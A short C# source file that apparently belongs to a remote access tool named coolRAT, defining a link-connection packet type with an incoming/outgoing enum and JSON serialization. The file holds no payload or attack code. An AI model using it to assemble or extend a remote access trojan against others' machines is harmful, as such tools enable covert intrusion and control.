using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public enum ConnectionType
    {
        Incoming,
        Outgoing
    }
    public class CAP_LinkConnectionPacket : Packet
    {
        public ConnectionType ConnectionType;

        public CAP_LinkConnectionPacket(Guid clientId, ConnectionType connectionType) : base(clientId)
        {
            ConnectionType = connectionType;
            Type = "CAP_LinkConnectionPacket";
        }

        public new string Serialize()
        {
            return JsonConvert.SerializeObject(this);
        }

        public new static CAP_LinkConnectionPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<CAP_LinkConnectionPacket>(packet_string);
        }
    }
}
